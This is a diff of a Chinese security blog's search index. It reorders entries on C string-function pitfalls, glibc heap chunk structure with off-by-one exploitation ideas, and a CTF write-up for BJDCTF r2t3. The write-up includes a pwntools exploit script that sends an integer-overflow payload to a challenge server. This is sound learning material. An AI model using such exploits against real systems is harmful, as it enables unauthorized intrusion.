@@ -64,19 +64,6 @@
       </categories>
   </entry>
   <entry>
-    <title>C语言中常见漏洞点</title>
-    <url>/article/C/</url>
-    <content><![CDATA[<h1 id="记录常见漏洞点"><a href="#记录常见漏洞点" class="headerlink" title="记录常见漏洞点"></a>记录常见漏洞点</h1><span id="more"></span>
-
-<h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p>
-<p>这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的</p>
-<h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one </p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>CISCN_2021</title>
     <url>/article/CISCN_2021/</url>
     <content><![CDATA[<h1 id="CISCN-2021"><a href="#CISCN-2021" class="headerlink" title="CISCN_2021"></a>CISCN_2021</h1><span id="more"></span>
@@ -247,6 +234,19 @@
       </tags>
   </entry>
   <entry>
+    <title>C语言中常见漏洞点</title>
+    <url>/article/C/</url>
+    <content><![CDATA[<h1 id="记录常见漏洞点"><a href="#记录常见漏洞点" class="headerlink" title="记录常见漏洞点"></a>记录常见漏洞点</h1><span id="more"></span>
+
+<h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p>
+<p>这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的</p>
+<h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one </p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>DASCTF_2021_3</title>
     <url>/article/DASCTF_2021_3/</url>
     <content><![CDATA[<p>DASCTF 2021三月赛</p>
@@ -293,51 +293,6 @@
       </categories>
       <tags>
         <tag>EIP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Heap_Learn</title>
-    <url>/article/Heap_Learn/</url>
-    <content><![CDATA[<h1 id="Heap-Learn"><a href="#Heap-Learn" class="headerlink" title="Heap_Learn"></a>Heap_Learn</h1><span id="more"></span>
-
-<h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk </span><br><span class="line">| 		prev_size		 |	  	size  		|A|M|P|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| user data	(fd)		 |	 	(bk)			  |</span><br><span class="line">|												|</span><br><span class="line">|												|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk</span><br></pre></td></tr></table></figure>
-
-<p><strong>prev_size</strong>，物理相邻的前一个chunk是空闲的话，则记录前一个chunk的大小（包括chunk头）；<br>                    若前一个chunk处于使用状态，则可以存储前一个chunk的数据。<strong>这是 chunk 中的空间复用</strong></p>
-<p><strong>size</strong>，必须是 2 * SIZE_SZ 的整数倍。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。</p>
-<ul>
-<li>A：NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
-</ul>
-<ul>
-<li><p>M：IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p>
-</li>
-<li><p>P：<strong>PREV_INUSE</strong>，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
-</li>
-</ul>
-<p><strong>fd</strong>，<strong>bk</strong> 。chunk在分配状态下存储数据，在free了chunk之后：</p>
-<ul>
-<li>fd 指向下一个空闲的chunk（非物理相邻）</li>
-<li>bk指向上一个空闲的chunk（非物理相邻）</li>
-</ul>
-<h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞的产生与边界验证不严和字符串操作有关，包括</p>
-<ul>
-<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
-<li>字符串操作不合适</li>
-</ul>
-<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
-<li><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p>
-</li>
-<li><p>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。</p>
-<p>（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。</p>
-<p>（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code>     找到的块的大小与<code>prev_size</code> 是否一致。</p>
-</li>
-</ol>
-<h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><p>当 large bin 中只存在一个chunk，那么该 chunk 的两个 nextsize指针都会指向自己</p>
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>Heap</tag>
       </tags>
   </entry>
   <entry>
@@ -422,6 +377,51 @@
       <categories>
         <category>比赛WriteUp</category>
       </categories>
+  </entry>
+  <entry>
+    <title>Heap_Learn</title>
+    <url>/article/Heap_Learn/</url>
+    <content><![CDATA[<h1 id="Heap-Learn"><a href="#Heap-Learn" class="headerlink" title="Heap_Learn"></a>Heap_Learn</h1><span id="more"></span>
+
+<h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk </span><br><span class="line">| 		prev_size		 |	  	size  		|A|M|P|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| user data	(fd)		 |	 	(bk)			  |</span><br><span class="line">|												|</span><br><span class="line">|												|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk</span><br></pre></td></tr></table></figure>
+
+<p><strong>prev_size</strong>，物理相邻的前一个chunk是空闲的话，则记录前一个chunk的大小（包括chunk头）；<br>                    若前一个chunk处于使用状态，则可以存储前一个chunk的数据。<strong>这是 chunk 中的空间复用</strong></p>
+<p><strong>size</strong>，必须是 2 * SIZE_SZ 的整数倍。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。</p>
+<ul>
+<li>A：NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
+</ul>
+<ul>
+<li><p>M：IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p>
+</li>
+<li><p>P：<strong>PREV_INUSE</strong>，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
+</li>
+</ul>
+<p><strong>fd</strong>，<strong>bk</strong> 。chunk在分配状态下存储数据，在free了chunk之后：</p>
+<ul>
+<li>fd 指向下一个空闲的chunk（非物理相邻）</li>
+<li>bk指向上一个空闲的chunk（非物理相邻）</li>
+</ul>
+<h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞的产生与边界验证不严和字符串操作有关，包括</p>
+<ul>
+<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
+<li>字符串操作不合适</li>
+</ul>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
+<li><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p>
+</li>
+<li><p>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。</p>
+<p>（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。</p>
+<p>（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code>     找到的块的大小与<code>prev_size</code> 是否一致。</p>
+</li>
+</ol>
+<h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><p>当 large bin 中只存在一个chunk，那么该 chunk 的两个 nextsize指针都会指向自己</p>
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>Heap</tag>
+      </tags>
   </entry>
   <entry>
     <title>ISCC_2021</title>
@@ -1151,6 +1151,40 @@
       </tags>
   </entry>
   <entry>
+    <title>整形溢出</title>
+    <url>/article/Shaping%20overflow/</url>
+    <content><![CDATA[<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><span id="more"></span>
+<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>来自buuctf</p>
+<p>先看ida</p>
+<p><img src="https://img-blog.csdnimg.cn/20201123233054809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>buf缓冲区大小为408h，而read读取大小为400h，比buf要小，所以不能进行简单的缓冲区栈溢出。</p>
+<p>再看name_check函数，v3是int8类型的变量，1111 1111 = 0xFF = 255。当0xFF +1的时侯，变量发生整形溢出，0x100 = 256 此时v3的数值为零（0000 0000），但是这只是显示了一个字节，其实再计算机里面会溢出，前面会进行进位操作变成 1 0000 0000。</p>
+<p>同时还要满足3&lt; v3 &lt;8 的条件，这时候可以确定溢出数值是在 0x104~0x107 中</p>
+<p><img src="https://img-blog.csdnimg.cn/20201123233312233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>后面的strcpy()函数将s复制给dest,看到dest的偏移为0x11+4</p>
+<p>程序中给出了/bin/sh的地址</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26213</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048594</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x15</span>) + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x104</span>-<span class="number">0x19</span>) <span class="comment"># 0x15 + 0x4 + n = 0x104 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<p>Int8, 等于Byte, 占1个字节.</p>
+<p>　   Int16, 等于short, 占2个字节. -32768 32767</p>
+<p>　   Int32, 等于int, 占4个字节. -2147483648 2147483647</p>
+<p>　   Int64, 等于long, 占8个字节. -9223372036854775808 9223372036854775807</p>
+<p>   　这样, 看起来比short,int,long更加直观些!</p>
+<p>　　 另外, 还有一个Byte, 它等于byte, 0 - 255.</p>
+<p>　　所以说这里的v3是占一个字节的，一个字节是由8位二进制决定的。</p>
+<p>　　例如：0000 0000 就是一个字节，代表0，1111 1111 也是一个字节，代表255.</p>
+<p><a href="https://www.jianshu.com/p/757fe6d91669">参考1</a><br><a href="https://www.cnblogs.com/bhxdn/p/12572580.html">参考2</a></p>
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>整形溢出</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>栈迁移</title>
     <url>/article/Stack%20migration/</url>
     <content><![CDATA[<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><span id="more"></span>
@@ -1207,40 +1241,6 @@
       </categories>
       <tags>
         <tag>栈迁移</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>整形溢出</title>
-    <url>/article/Shaping%20overflow/</url>
-    <content><![CDATA[<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><span id="more"></span>
-<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>来自buuctf</p>
-<p>先看ida</p>
-<p><img src="https://img-blog.csdnimg.cn/20201123233054809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>buf缓冲区大小为408h，而read读取大小为400h，比buf要小，所以不能进行简单的缓冲区栈溢出。</p>
-<p>再看name_check函数，v3是int8类型的变量，1111 1111 = 0xFF = 255。当0xFF +1的时侯，变量发生整形溢出，0x100 = 256 此时v3的数值为零（0000 0000），但是这只是显示了一个字节，其实再计算机里面会溢出，前面会进行进位操作变成 1 0000 0000。</p>
-<p>同时还要满足3&lt; v3 &lt;8 的条件，这时候可以确定溢出数值是在 0x104~0x107 中</p>
-<p><img src="https://img-blog.csdnimg.cn/20201123233312233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>后面的strcpy()函数将s复制给dest,看到dest的偏移为0x11+4</p>
-<p>程序中给出了/bin/sh的地址</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26213</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048594</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x15</span>) + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x104</span>-<span class="number">0x19</span>) <span class="comment"># 0x15 + 0x4 + n = 0x104 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<p>Int8, 等于Byte, 占1个字节.</p>
-<p>　   Int16, 等于short, 占2个字节. -32768 32767</p>
-<p>　   Int32, 等于int, 占4个字节. -2147483648 2147483647</p>
-<p>　   Int64, 等于long, 占8个字节. -9223372036854775808 9223372036854775807</p>
-<p>   　这样, 看起来比short,int,long更加直观些!</p>
-<p>　　 另外, 还有一个Byte, 它等于byte, 0 - 255.</p>
-<p>　　所以说这里的v3是占一个字节的，一个字节是由8位二进制决定的。</p>
-<p>　　例如：0000 0000 就是一个字节，代表0，1111 1111 也是一个字节，代表255.</p>
-<p><a href="https://www.jianshu.com/p/757fe6d91669">参考1</a><br><a href="https://www.cnblogs.com/bhxdn/p/12572580.html">参考2</a></p>
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>整形溢出</tag>
       </tags>
   </entry>
   <entry>
